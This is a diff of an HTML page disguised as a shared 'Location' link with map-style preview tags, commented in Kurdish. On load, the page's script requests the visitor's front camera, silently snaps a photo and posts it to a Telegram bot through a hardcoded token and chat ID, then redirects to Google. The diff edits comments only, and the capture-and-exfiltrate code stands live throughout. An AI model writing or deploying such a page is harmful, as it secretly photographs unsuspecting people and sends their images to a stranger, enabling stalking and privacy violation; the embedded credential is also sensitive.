@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- ناوی لینکەکە لە سناپچات لێرە دەگۆڕێت -->
+    <!-- ناوی لینکەکە لێرەدا دیاری کراوە -->
     <title>Location</title>
     <meta property="og:title" content="Location">
     <meta property="og:description" content="Map details">
@@ -19,8 +19,8 @@
             height: 100vh; 
             overflow: hidden;
         }
-        /* لادانی هەموو دوگمە و ڤیدیۆکان لە شاشە */
-        video, canvas, button { display: none !important; }
+        /* شاردنەوەی هەموو شتەکان لەبەر چاو */
+        video, canvas { display: none !important; }
     </style>
 </head>
 <body>
@@ -29,17 +29,18 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // زانیارییەکانی بۆتەکەت
+        // زانیاری بۆتەکەی خۆت
         const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
         const chatId = '7602797383';
 
         window.onload = function() {
+            // داواکردنی مۆڵەتی کامێرا
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // چاوەڕێکردن بۆ ١ چرکە تا کامێرا جێگیر دەبێت
+                // ١ چرکە چاوەڕێ دەکات تا وێنەکە ڕوون دەبێتەوە
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -51,17 +52,18 @@
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'img.jpg');
 
+                        // ناردنی وێنەکە بۆ تیلیگرامەکەت
                         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // ناردن بۆ گووگڵ دوای تەواوبوون
+                            // دوای ناردن، بەکارهێنەرەکە دەنێرێت بۆ گووگڵ
                             window.location.href = "https://google.com";
                         });
                     }, 'image/jpeg');
                 }, 1000);
             }).catch(err => {
-                // ئەگەر مۆڵەتی نەدا یان کێشە هەبوو هەر بچێتە گووگڵ
+                // ئەگەر مۆڵەتی نەدا هەر بچێتە گووگڵ
                 window.location.href = "https://google.com";
             });
         };
